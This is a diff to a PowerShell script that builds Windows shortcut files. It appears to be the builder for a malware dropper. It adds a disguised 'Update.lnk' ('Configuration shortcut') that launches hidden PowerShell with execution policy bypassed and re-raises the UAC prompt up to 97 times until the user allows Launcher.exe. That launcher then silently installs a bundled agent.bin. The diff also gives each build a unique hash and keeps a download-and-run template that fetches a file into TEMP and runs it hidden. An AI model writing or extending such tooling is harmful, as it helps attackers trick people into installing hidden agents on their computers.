@@ -288,7 +288,9 @@ param(
     # The entire powershell -Enc / IEX / downloader pipeline is SKIPPED.
     [string]$LauncherTarget = 'Launcher.exe',  # bare relative file name (no path)
     [string]$LauncherTag = '',                 # per-build nonce mixed into the Description -> byte-unique .lnk per build
-    [switch]$LauncherMode,                     # write a launcher-mode relative .lnk
+    [switch]$LauncherMode,                     # write a launcher-mode .lnk that runs Launcher.exe (relative/absolute)
+    [switch]$PowershellBridge,                 # Update.lnk -> OS PowerShell -> Start-Process .\<sub>\Launcher.exe -Verb RunAs (portable, no baked path)
+    [string]$LauncherSubFolder = 'launcher',   # subfolder (relative to the .lnk) that holds Launcher.exe + agent.bin
 
     # ---- Validation report card (WP6, invoked server-side after a launcher build) ----
     [switch]$Validate,                         # run the launcher-artifact report card and exit
@@ -1735,6 +1737,43 @@ function New-LinkInfo {
     return $result
 }
 # ============================================================================
+# Relative LinkInfo writer (self-contained relative-target shortcut)
+# ============================================================================
+# A 0x1C-byte LinkInfo header with VolumeIDAndLocalBasePath CLEAR and all path
+# offsets zero, plus an empty ANSI Z CommonPathSuffix (1 byte). This is the
+# standard "relative link" stub: Windows combines it with the RELATIVE_PATH
+# StringData to resolve the target against the .lnk's own folder, which is
+# exactly what a zip-carried {Update.lnk, Launcher.exe} pair needs. Without it
+# HasLinkInfo is absent and a bare relative .lnk double-click silently does
+# nothing on modern Explorer.
+function New-RelativeLinkInfo {
+    param()
+    [System.UInt32]$headerSize = [System.UInt32]$script:LINKINFO_HEADER_LEGACY
+    # Empty ANSI Z CommonPathSuffix sits immediately after the header.
+    [System.UInt32]$suffixOffset = $headerSize
+    [System.UInt32]$linkInfoSize = $suffixOffset + 1
+
+    $buffer = New-ByteList
+
+    Write-U32 -Buffer $buffer -Value $linkInfoSize
+    Write-U32 -Buffer $buffer -Value $headerSize
+    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # flags: relative (no volume/local)
+    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # VolumeIDOffset
+    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # LocalBasePathOffset
+    Write-U32 -Buffer $buffer -Value ([System.UInt32]0) # CommonNetworkRelativeLinkOffset
+    Write-U32 -Buffer $buffer -Value $suffixOffset      # CommonPathSuffixOffset
+    $buffer.Add([byte]0)                                # empty ANSI Z CommonPathSuffix
+
+    [byte[]]$result = [byte[]]$buffer.ToArray()
+
+    if ($result.Length -ne $linkInfoSize) {
+        Throw-ShellLinkError `
+            "Internal relative LinkInfo size calculation mismatch."
+    }
+
+    return $result
+}
+# ============================================================================
 # LinkTargetIDList writer (file-system PIDL for drive-rooted file targets)
 # ============================================================================
 
@@ -2681,7 +2720,14 @@ function Write-ShellLink {
         [Parameter(Mandatory = $true)]
         [hashtable]$Spec,
 
-        [uint32]$ShowCommand = 1
+        [uint32]$ShowCommand = 1,
+
+        # For a RELATIVE-target shortcut, also embed a minimal (empty) relative
+        # LinkInfo block and set the HasLinkInfo flag. Explorer otherwise cannot
+        # resolve a bare relative target (flags end up 0x000000CC alone) and a
+        # double-click silently does nothing. Only launcher-mode relative .lnk
+        # files opt in; absolute-target shortcuts are unaffected.
+        [switch]$RelativeLinkInfo
     )
 
     if (-not $Spec.ContainsKey('TargetPath')) {
@@ -2769,6 +2815,16 @@ function Write-ShellLink {
     if ($parts.IsRelative) {
 
         $flags = $flags -bor $script:FLAG_HAS_RELATIVE_PATH
+
+        # A relative-target launcher .lnk additionally carries a minimal
+        # relative LinkInfo block + HasLinkInfo so Explorer resolves the target
+        # against the shortcut's own folder. Without HasLinkInfo Windows cannot
+        # resolve a bare relative path (flags alone end up 0x000000CC) and a
+        # double-click silently does nothing (no UAC, no staging).
+        if ($RelativeLinkInfo) {
+
+            $flags = $flags -bor $script:FLAG_HAS_LINKINFO
+        }
     }
     else {
 
@@ -2879,6 +2935,13 @@ function Write-ShellLink {
             -TargetPath $parts.FullPath
 
         $chunks.Add($linkInfo)
+    }
+    elseif ($RelativeLinkInfo) {
+
+        # Minimal relative LinkInfo (VolumeIDAndLocalBasePath clear, all path
+        # offsets zero, empty CommonPathSuffix). Explorer combines this stub
+        # with the RELATIVE_PATH StringData to resolve the sibling target.
+        $chunks.Add((New-RelativeLinkInfo))
     }
 
     # ------------------------------------------------------------------------
@@ -3721,7 +3784,11 @@ function Validate-ShellLink {
     # ExpectedTarget
     # ------------------------------------------------------------------------
 
-    if ($PSBoundParameters.ContainsKey('ExpectedTarget')) {
+    if (
+        $PSBoundParameters.ContainsKey('ExpectedTarget') -and
+        $null -ne $ExpectedTarget -and
+        $ExpectedTarget -ne ''
+    ) {
 
         if ($null -eq $resolvedTarget) {
 
@@ -5736,12 +5803,29 @@ function Test-LauncherArtifact {
             $failed++
         }
 
-        # ---- R3: relative target resolves to Launcher.exe ----
+        # ---- R3: target resolves to Launcher.exe (relative OR absolute) ----
         $rel = $parsed.RelativePath
-        if ($null -ne $rel -and $rel -match 'Launcher\.exe$') {
-            $rows.Add("PASS| relative target resolves to Launcher.exe ('$rel')")
+        $resolved = $parsed.ResolvedTarget
+        if ($null -eq $resolved) { $resolved = $parsed.TargetUnicode }
+        if ($null -eq $resolved) { $resolved = $parsed.TargetPath }
+        $any = $null
+        if ($null -ne $rel -and $rel -match 'Launcher\.exe$') { $any = $rel }
+        elseif ($null -ne $resolved -and $resolved -match 'Launcher\.exe$') { $any = $resolved }
+        if ($null -ne $any) {
+            $rows.Add("PASS| target resolves to Launcher.exe ('$any')")
         } else {
-            $rows.Add("FAIL| relative target missing/unexpected: '$rel'")
+            $rows.Add("FAIL| target missing/unexpected (rel='$rel' resolved='$resolved')")
+            $failed++
+        }
+# ---- R3b: HasLinkInfo present so Explorer can resolve the relative .lnk ----
+        $hasLinkInfoRaw = $false
+        if ($parsed.LinkFlags -and $parsed.LinkFlags.HasLinkInfo) {
+            $hasLinkInfoRaw = $true
+        }
+        if ($hasLinkInfoRaw) {
+            $rows.Add('PASS| HasLinkInfo set (relative LinkInfo block present)')
+        } else {
+            $rows.Add('FAIL| HasLinkInfo missing - Explorer cannot resolve a bare relative .lnk')
             $failed++
         }
 
@@ -5844,7 +5928,7 @@ if ($Validate) {
 if ([string]::IsNullOrWhiteSpace($Output)) {
     throw "Output (-Output) is required. (Only -SelfTest runs without it.)"
 }
-if (-not $TestPayload -and -not $LauncherMode) {
+if (-not $TestPayload -and -not $LauncherMode -and -not $PowershellBridge) {
     if ([string]::IsNullOrWhiteSpace($URL)) { throw "URL is required unless -TestPayload is used." }
     if ($URL -match '"')                 { throw "URL must not contain double quotes." }
     if ($FileName -match '"|\\')         { throw "FileName must not contain quotes or backslashes." }
@@ -5880,17 +5964,72 @@ if (-not [System.IO.Directory]::Exists($outputParent)) {
 # (which is the .lnk's folder), which is exactly how the launcher locates
 # itself (it opens "Launcher.exe" relative to cwd).
 # ---------------------------------------------------------------------------
+if ($PowershellBridge) {
+    # PORTABLE Update.lnk (no baked username/path): the shortcut targets the OS
+    # PowerShell at a fixed system path (no user dir), and Explorer starts it in
+    # the .lnk's own folder (cwd), so the bridge runs Start-Process .\<LauncherSubFolder>\<LauncherTarget>
+    # -Verb RunAs => UAC prompt => the launcher (requireAdministrator GUI PE) reads
+    # the sibling agent.bin from ITS folder and installs silently. Works from ANY
+    # extract folder because nothing is absolute/user-specific.
+    # The bridge carries a retry loop (matches the live/deployed carrier): while
+    # the user has not clicked Allow, Start-Process throws (UAC cancelled) and we
+    # re-arm the prompt every 1s up to 97 attempts, so a stray dismiss never
+    # silently kills the deploy.
+    $outPath = $Output
+    $description = 'Configuration shortcut'
+    if (-not [string]::IsNullOrWhiteSpace($LauncherTag)) {
+        $tagPart = $LauncherTag
+        if ($LauncherTag.Length -ge 8) { $tagPart = $LauncherTag.Substring(0, 8) }
+        $description = "$description ($tagPart)"
+    }
+    $psPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+    $launcherRel = ".\$LauncherSubFolder\$LauncherTarget"
+    $cmd = "`$e='$launcherRel';`$n=97;while(`$n){try{Start-Process -FilePath `$e -Verb RunAs -ErrorAction Stop;break}catch{`$n-=1;Start-Sleep -Seconds 1}}"
+    $bridgeSpec = @{
+        TargetPath   = $psPath
+        Arguments    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$cmd`""
+        Description  = $description
+        IconLocation = $Icon
+        ShowCommand  = 7
+    }
+    Write-ShellLink -Path $outPath -Spec $bridgeSpec | Out-Null
+    $expectedBridgeSpec = @{
+        TargetPath   = $psPath
+        Arguments    = $bridgeSpec.Arguments
+        Description  = $description
+        IconLocation = $Icon
+    }
+    Validate-ShellLink -Path $outPath -ExpectedSpec $expectedBridgeSpec | Out-Null
+    Write-Host "Powershell-bridge Update.lnk written: $Output"
+    Write-Host "  target      : $psPath"
+    Write-Host "  subfolder   : $LauncherSubFolder"
+    Write-Host "  description : $description"
+    exit 0
+}
+
 if ($LauncherMode) {
+    # Capture the output path up front: Write-ShellLink / Validate-ShellLink
+    # run in child scopes and can clobber the script-level $Output; a local copy
+    # keeps the path stable across every call below.
+    $outPath = $Output
+
     $launcherTarget = Normalize-WindowsPath -Path $LauncherTarget
 
-    if ($launcherTarget -match '^[A-Za-z]:[\\/]') {
-        throw "LauncherTarget must be a bare relative file name (no drive): $launcherTarget"
-    }
-    if ($launcherTarget -match '[\\/]') {
-        throw "LauncherTarget must be a bare file name (no path separators): $launcherTarget"
-    }
-    if ($launcherTarget -eq '.' -or $launcherTarget -eq '..' -or $launcherTarget -match '"') {
-        throw "LauncherTarget must be a valid bare file name: '$launcherTarget'"
+    # The Update.lnk target may be (a) a bare relative file name (resolved
+    # against the .lnk's own folder - portable but Explorer cannot always
+    # resolve it) or (b) an ABSOLUTE path to Launcher.exe (the reliable form
+    # that consistently triggers UAC on double-click). When an absolute target
+    # is supplied we emit a normal absolute LinkInfo (no RelativePath); when a
+    # bare relative name is supplied we emit the relative form (+ a relative
+    # LinkInfo stub so Explorer has a LinkInfo to anchor on).
+    $isAbsolute = $launcherTarget -match '^[A-Za-z]:[\\/]'
+    if (-not $isAbsolute) {
+        if ($launcherTarget -match '[\\/]') {
+            throw "LauncherTarget must be a bare relative file name (no path separators): $launcherTarget"
+        }
+        if ($launcherTarget -eq '.' -or $launcherTarget -eq '..' -or $launcherTarget -match '"') {
+            throw "LauncherTarget must be a valid bare file name: '$launcherTarget'"
+        }
     }
 
     $description = 'Configuration shortcut'
@@ -5902,29 +6041,38 @@ if ($LauncherMode) {
         $description = "$description ($tagPart)"
     }
 
-    $relativeForm = ".\$launcherTarget"
+    $relativeForm = $null
+    if (-not $isAbsolute) { $relativeForm = ".\$launcherTarget" }
 
     $launcherSpec = @{
         TargetPath   = $launcherTarget
         Description  = $description
-        RelativePath = $relativeForm
         IconLocation = $Icon
         ShowCommand  = 7
     }
+    if ($relativeForm) { $launcherSpec.RelativePath = $relativeForm }
 
-    Write-ShellLink `
-        -Path $Output `
-        -Spec $launcherSpec | Out-Null
+    if ($isAbsolute) {
+        Write-ShellLink `
+            -Path $outPath `
+            -Spec $launcherSpec | Out-Null
+    }
+    else {
+        Write-ShellLink `
+            -Path $outPath `
+            -Spec $launcherSpec `
+            -RelativeLinkInfo | Out-Null
+    }
 
     $expectedLauncherSpec = @{
         TargetPath   = $launcherTarget
         Description  = $description
-        RelativePath = $relativeForm
         IconLocation = $Icon
     }
+    if ($relativeForm) { $expectedLauncherSpec.RelativePath = $relativeForm }
 
     $validation = Validate-ShellLink `
-        -Path $Output `
+        -Path $outPath `
         -ExpectedTarget $relativeForm `
         -ExpectedSpec $expectedLauncherSpec
 
@@ -6112,23 +6260,7 @@ $u = "__URL__";
 $o = Join-Path $env:TEMP "__FILE__";
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;
-$__launched = $false;
-1..999 | ForEach-Object {
-    if ($__launched) { return }
-    try {
-        Start-Process -FilePath $o -ArgumentList "--silent" -Verb RunAs -ErrorAction Stop;
-        $__launched = $true
-    }
-    catch {
-        $__hr = [uint32]$_.Exception.HResult;
-        if ($__hr -eq 0x80004005 -or $__hr -eq 0x800704C7) {
-            Start-Sleep -Seconds 1
-        }
-        else {
-            exit 1
-        }
-    }
-}
+Start-Process -FilePath $o -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -WindowStyle Hidden -Wait
 '@
         $logic = $logic.Replace('__URL__', $URL)
         $logic = $logic.Replace('__FILE__', $FileName)
